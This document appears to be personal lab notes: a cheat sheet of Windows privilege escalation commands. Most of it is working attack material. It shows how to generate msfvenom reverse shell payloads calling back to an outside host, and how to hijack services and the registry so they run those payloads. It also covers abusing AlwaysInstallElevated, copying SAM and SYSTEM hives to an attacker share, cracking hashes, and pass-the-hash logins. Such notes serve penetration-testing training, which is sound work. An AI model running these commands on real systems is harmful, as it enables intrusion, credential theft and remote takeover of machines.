### Key terms

**resources**(a.k. objects): Files/Directories, Registry entries, Services

**ACL**(acces cintrol list) list defines whether a certain user or group has permission to perform a certain action on a resource
ACL contains of ACE(access control entry), each ACE defines the relationship between a principle(e.g. user, group) and a certain access right.


### Shells

```
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

### Automated tools

**Powerup**

```
powershell
. .\PowerUp.ps1
Invoke-Allchecks
```

**Shurpup**

```
.\SharUp.exe 
```

**Seatbelt**

just list the information related to potential privilege escalation

```
.\SeatBelt -- print help menu
.\SeatBelt all
.\SeatBelt NonstandardProcesses
```

**Winpeas** 

enable colors if needed

```
reg add HKCU\Console /v VirtualTerminalLevek /t REG_DWORD /d 1
...
open new cmd
```

```
.\winpeas.exe
```

### Permissions
accesschk.exe check whether a user or a group has access to files, dirs. services etc.

use older version, as new will spawn a GUI popup window

```
accesschk.exe /accepteula -uwcqv user daclsvc  -- right access
accesschk.exe /accepteula -ucqv user daclsvc  -- chek permissions
accesschk.exe /accepteula -uwdq c:\  -- check write permissions for dirs
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc --chec registry permissions
```

```
icacls C:\ 
```

### Kernel exploits

`last thing you want to do`

```
systeminfo > \\10.8.67.157\\systeminfo.txt
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploit-only | more
```

### Services
+ change binary in the configuration to revshell restart
+ check if we can right to any of the pieces of unqoated service path
+ registry permissions
+ insecyre service executables
+ DLL hijacking (download binary to your machine and use procmon to find "not found" dlls, check non-microsoft services for example)

`seek for possibility of edditing anythin + stop/start the service or restarting the machine`

run winpeas to find the services 

```
.\winpeas.exe quiet servicesinfo
```

check service permissions

```
accesschk.exe /accepteula -uwcqv user daclsvc  -- right access
accesschk.exe /accepteula -ucqv user daclsvc  -- chek permissions
```

if no accesscheck available https://www.winhelponline.com/blog/view-edit-service-permissions-windows/#sc_sdshow

```target
sc sdshow AdvancedSystemCareService9
```

```you
ConvertFrom-SddlString -sddl "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;RPWPDT;;;S-1-5-21-3029548963-3893655183-1231094572-1001)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
```

query the configuration of a service

```
sc.exe qc servname
```

query the status of a service

```
sc.exe query servname
```

modify a configuration option of a service

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

start / stop services

```
net start/stop servname
```

query the registry entry

```
reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc 
```

add to registry

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

query the registry for autoruns

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

check if service binary is writable - backup - copy reverse shell

```
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"


copy "C:\Program Files\File Permissions Service\filepermservice.exe" .

copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f dll -o dllhijack.exe
```


### Registry
+ autoruns (if you can write to the autorun executable and restart the system - you get system)
+ alwaysinstallelevated


```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

both should be present for exploit to work

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

```
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```


seacrh for passwords

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"


winexe -U 'admin%password' //10.10.43.125 cmd.exe
```


### Passwords

```
winPEASany.exe filesinfo userinfo
```

use winpeas with userinfo anf file

```
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

Transfer the SAM and SYSTEM files to your Kali VM:

```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\   copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

```
git clone https://github.com/Tib3rius/creddump7   pip3 install pycrypto   python3 creddump7/pwdump.py SYSTEM SAM`


hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

don't run from the system root, better run from the user home, or application directory or program directory

```
dir /s *pass* == *.config

findstr /si password *.xml *.ini *.txt
```

pass the hash instead of the password

```
pth-winexe -U 'admin%hash' //10.10.43.125 cmd.exe
```

### Scheduled tasks

```
schtasks /query /fo LIST /v 

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
```

### StartUps
```

C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

cscript C:\PrivEsc\CreateShortcut.vbs
```